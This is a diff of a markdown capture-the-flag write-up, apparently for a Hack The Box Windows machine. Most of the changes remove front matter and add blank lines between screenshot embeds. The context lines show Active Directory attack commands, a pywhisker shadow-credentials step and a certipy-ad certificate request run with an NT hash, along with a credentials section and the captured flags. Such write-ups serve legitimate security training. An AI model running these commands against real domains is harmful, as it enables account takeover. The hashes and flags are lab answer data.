@@ -1,8 +1,3 @@
----
-Started: "06-07-25 | 22:28"
-Ended: "06-07-25 |"
----
-
 #CTF/HTB/Windows/Medium
 
 # Given
@@ -81,10 +76,13 @@ Bloodhound gives us the map of the network, and if we trace the outgoing connect
 Bloodhound provides some help with exploiting each relationship.
 
 ![](Assets/Pasted%20image%2020250707112247.png)
+
 ![](Assets/Pasted%20image%2020250707113303.png)
+
 ![](Assets/Pasted%20image%2020250707114223.png)
 
 ![](Assets/Pasted%20image%2020250707114446.png)
+
 ![](Assets/Pasted%20image%2020250707114503.png)
 
 ### Management Group (WriteOwner)
@@ -200,10 +198,15 @@ pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target
 ```
 
 ![](Assets/Pasted%20image%2020250707130639.png)
+
 ![](Assets/Pasted%20image%2020250707131414.png)
+
 ![](Assets/Pasted%20image%2020250707131832.png)
+
 ![](Assets/Pasted%20image%2020250707133334.png)
+
 ![](Assets/Pasted%20image%2020250707133740.png)
+
 ```bash
 ┌──(root㉿n0m4d)-[/host_data]
 └─# faketime "$(ntpdate -q DC01.certified.htb | cut -d ' ' -f 1,2)" certipy-ad req -u ca_operator -hashes :b4b86f45c6018f1b664f70805f45d8f2 -ca certified-DC01-CA -template CertifiedAuthentication -dc-ip 10.10.11.41
@@ -251,7 +254,6 @@ Certipy v5.0.2 - by Oliver Lyak (ly4k)
 
 ![](Assets/Pasted%20image%2020250707134217.png)
 
-
 # Creds
 
 ```bash
@@ -265,10 +267,13 @@ NT hash for 'ca_operator': b4b86f45c6018f1b664f70805f45d8f2
 # Flags
 
 user: 1f51c97b100492c4ef8b3d4fc371e658
+
 root: 56b68e4d11339110104af6dcff819495
 
 ![](Assets/Pasted%20image%2020250707131011.png)
 
 ![](Assets/Pasted%20image%2020250707130931.png)
+
 ![](Assets/Pasted%20image%2020250707134455.png)
+
 # Proof
